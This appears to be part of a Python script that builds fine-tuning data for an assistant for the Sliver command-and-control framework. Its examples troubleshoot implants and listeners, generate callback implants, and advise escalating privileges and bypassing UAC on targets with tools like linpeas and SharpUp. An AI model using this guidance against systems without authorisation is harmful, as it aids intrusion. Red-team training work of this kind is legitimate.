1. **Session died** - The implant process was terminated on the target
2. **Network issue** - Connection was interrupted
3. **ID mismatch** - Session IDs are long; ensure you're using the correct one

**If the session is gone:**
- Check if you have other sessions: `sessions`
- If you deployed a beacon, check: `beacons`
- Regenerate the implant if needed: `regenerate --name <implant-name>`

**Prevention:** Consider using beacons for persistence - they automatically reconnect and are more resilient to network issues.""",
    },
    {
        "error": "listener port in use",
        "instruction": "I can't start a listener, it says the port is already in use",
        "output": """Port conflict - something else is using that port.

**Check what's using the port:**
```
jobs                    # See existing Sliver listeners
```

On your system:
```bash
netstat -tulpn | grep <port>
lsof -i :<port>
```

**Solutions:**

1. **Use a different port:**
```
mtls --lport 9999
https --lport 8443
```

2. **Kill existing Sliver job:**
```
jobs --kill <job-id>
```

3. **Kill other process:** Stop whatever else is using the port.

**Common culprits:**
- Previous Sliver listeners
- Web servers (80, 443, 8080)
- Development servers
- Other C2 frameworks""",
    },
    {
        "error": "implant not connecting",
        "instruction": "I deployed the implant but it's not connecting back to my listener",
        "output": """No callback issues are common. Let's debug:

**1. Verify listener is running:**
```
jobs
```
You should see your listener with status "Running".

**2. Check implant configuration:**

Did the implant use the correct C2 address?
```
implants                # Check configured C2 URLs
```

**3. Network issues:**

- Firewall blocking egress on target?
- Target can reach your C2 server?
- Using correct protocol (mTLS requires cert exchange)?

**4. For beacons:**

Beacons have a check-in interval. Wait for the configured time (e.g., 60 seconds).

**Debugging steps on target (if you have other access):**
```
# Can target resolve/reach C2?
nslookup yourserver.com
ping yourserver.com
curl https://yourserver.com:443
```

**5. Try different C2:**

If mTLS fails, try HTTPS or HTTP:
```
http --lport 8080
generate --http yourserver.com:8080 --os windows
```

**6. Check for proxy:**

Target might require proxy. Add proxy-aware settings if needed.""",
    },
    {
        "error": "access denied",
        "instruction": "I'm getting access denied when running commands on the target",
        "output": """Access denied indicates privilege or permission issues.

**Check your current context:**
```
whoami
getuid
info
```

**Common causes:**

1. **Insufficient privileges:**
   - Running as standard user, need admin/root
   - Solution: Escalate privileges first

2. **File/folder permissions:**
   - Can't access protected directories
   - Solution: Use directories you can write to (/tmp, C:\\Windows\\Temp)

3. **UAC (Windows):**
   - Even admin accounts may be filtered
   - Solution: Need to bypass or elevate

4. **Protected processes:**
   - LSASS, system processes are protected
   - Solution: Need SYSTEM access

**Privilege escalation paths:**

Windows:
```
execute-assembly ./SharpUp.exe audit
execute-assembly ./Seatbelt.exe -group=system
```

Linux:
```
upload ./linpeas.sh /tmp/lp.sh
execute -o /tmp/lp.sh
execute -o sudo -l
```

What command were you trying to run?""",
    },
]


def generate_command_training_data() -> list[dict]:
    """
    Generate training data from command knowledge base.
    Uses the comprehensive SLIVER_COMMANDS from sliver_knowledge_base.py
    """
    training_data = []

    for cmd_name, cmd_info in SLIVER_COMMANDS.items():
        # Generate "how to use" examples with varied templates
        for template in random.sample(USER_TEMPLATES["how_to"], min(3, len(USER_TEMPLATES["how_to"]))):
            action = cmd_info["description"].lower()

            training_data.append(
                {
                    "instruction": template.format(action=action),
                    "input": "",
                    "output": f"""To {action} in Sliver, use the `{cmd_name}` command:

**Syntax:**
```
{cmd_info["syntax"]}
```

**Examples:**
```
{chr(10).join(cmd_info["examples"])}
```

{cmd_info["explanation"]}""",
                }
            )

        # Generate direct command question
        training_data.append(
            {
                "instruction": f"What does the `{cmd_name}` command do in Sliver?",
                "input": "",
                "output": f"""`{cmd_name}` - {cmd_info["description"]}

**Syntax:**
```
{cmd_info["syntax"]}
```

{cmd_info["explanation"]}

**Examples:**
```
{chr(10).join(cmd_info["examples"])}
```""",
            }
        )

        # Generate "show me the syntax" question
        training_data.append(
            {
                "instruction": f"What's the syntax for the {cmd_name} command?",
                "input": "",
                "output": f"""The syntax for `{cmd_name}` is:

```
{cmd_info["syntax"]}
```

{cmd_info["description"]}.

**Examples:**
```
{chr(10).join(cmd_info["examples"])}
```""",
            }
        )

    return training_data


def generate_scenario_training_data() -> list[dict]:
    """
    Convert tactical scenarios to ShareGPT format.
    """
    training_data = []

    for scenario in TACTICAL_SCENARIOS:
        training_data.append(
            {
                "id": scenario["name"],
                "conversations": scenario["conversation"],
            }
        )

    return training_data


def generate_concept_explanations() -> list[dict]:
    """
    Generate explanations of Sliver concepts.
    """
    training_data = []

    for concept_data in CONCEPT_EXPLANATIONS:
        for template in USER_TEMPLATES["explain"]:
            training_data.append(
                {
                    "instruction": template.format(concept=concept_data["concept"]),
                    "input": "",
                    "output": concept_data["explanation"],
                }
            )

    return training_data


def generate_error_handling_data() -> list[dict]:
    """
    Generate error handling training examples.
    """
    training_data = []
    
    for error_example in ERROR_HANDLING_EXAMPLES:
        training_data.append(
            {
                "instruction": error_example["instruction"],
                "input": f"Error: {error_example['error']}",
                "output": error_example["output"],
            }
        )
        
        # Also add without input context
        for template in USER_TEMPLATES["troubleshoot"]:
            training_data.append(
                {
                    "instruction": template.format(action=error_example["error"]),
                    "input": "",
                    "output": error_example["output"],
                }
            )

    return training_data


def save_training_data(data: list[dict], filename: str, format: str = "alpaca"):
    """
    Save training data to file in specified format.
    """
    output_path = PROCESSED_DIR / filename
    output_path.parent.mkdir(parents=True, exist_ok=True)

    with open(output_path, "w") as f:
        for entry in data:
            f.write(json.dumps(entry) + "\n")

    print(f"[+] Saved {len(data)} entries to {output_path}")


def main():
    """Generate all training data."""
    print("=" * 60)
    print("Sliver Training Data Generator")
    print("=" * 60)
    print(f"\nUsing knowledge base with {get_command_count()} commands")

    # Generate command reference data
    print("\n[*] Generating command reference data...")
    command_data = generate_command_training_data()
    save_training_data(command_data, "commands/command_reference.jsonl")

    # Generate scenario data
    print("\n[*] Generating tactical scenario data...")
    scenario_data = generate_scenario_training_data()
    save_training_data(scenario_data, "scenarios/tactical_scenarios.jsonl", format="sharegpt")

    # Generate concept explanations
    print("\n[*] Generating concept explanations...")
    concept_data = generate_concept_explanations()
    save_training_data(concept_data, "explanations/concepts.jsonl")

    # Generate error handling data
    print("\n[*] Generating error handling data...")
    error_data = generate_error_handling_data()
    save_training_data(error_data, "conversations/error_handling.jsonl")

    # Summary
    total = len(command_data) + len(scenario_data) + len(concept_data) + len(error_data)
    print(f"\n{'=' * 60}")
    print(f"Total training entries generated: {total}")
    print(f"  - Command reference: {len(command_data)}")
    print(f"  - Tactical scenarios: {len(scenario_data)}")
    print(f"  - Concept explanations: {len(concept_data)}")
    print(f"  - Error handling: {len(error_data)}")
    print(f"{'=' * 60}")
    
    # Category breakdown
    print("\nCommand categories:")
    for category, cmds in COMMAND_CATEGORIES.items():
        print(f"  - {category}: {len(cmds)} commands")

    print("\nNext steps:")
    print("  1. Review generated data for accuracy")
    print("  2. Run validate_data.py to check quality")
    print("  3. Scrape official docs with scrape_docs.py")
    print("  4. Export for training with export_dataset.py")


if __name__ == "__main__":
    main()
